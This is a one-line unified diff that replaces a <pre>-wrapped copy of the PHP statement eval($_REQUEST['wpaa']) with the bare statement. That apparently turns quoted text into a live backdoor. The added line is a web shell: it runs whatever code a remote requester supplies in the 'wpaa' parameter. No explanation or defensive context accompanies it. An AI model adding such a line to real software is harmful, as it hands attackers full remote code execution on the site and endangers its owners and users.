@@ -1,1 +1,1 @@
-<pre>eval($_REQUEST['wpaa'])</pre>
+eval($_REQUEST['wpaa'])
